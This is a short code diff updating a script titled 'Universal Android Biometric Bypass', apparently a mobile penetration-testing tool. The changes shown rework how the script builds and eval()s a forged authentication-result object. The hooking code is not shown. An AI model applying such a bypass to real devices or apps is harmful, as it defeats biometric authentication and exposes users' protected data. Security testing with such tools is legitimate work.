@@ -1,5 +1,5 @@
 /*
-	Universal Android Biometric Bypass v0.2
+	Universal Android Biometric Bypass v0.3
 	author: ax - github.com/ax
 
 	Updated Android biometric bypass script (from Kamil Breński, Krzysztof Pranczk and Mateusz Fruba, August 2019)
@@ -44,7 +44,7 @@ function getArgsTypes(overloads) {
                parameters.push("'" + overloads[i].argumentTypes[j].className + "'")
            }
        // }
-        results.push('resultObj.$new(' + parameters.join(', ') + ');')
+        results.push('(' + parameters.join(', ') + ');')
     }
     return results.join('\n')
 }
@@ -58,6 +58,7 @@ function getAuthResult(resultObj, cryptoInst) {
 	resu = resu.replace('\'boolean\'', 'false');
 	resu = resu.replace(/'.*'/, 'null');
 	//console.log(resu);
+	resu = "resultObj.$new"+resu;
 	var authenticationResultInst = eval(resu);
     console.log("cryptoInst:, " + cryptoInst + " class: " + cryptoInst.$className);
     return authenticationResultInst;
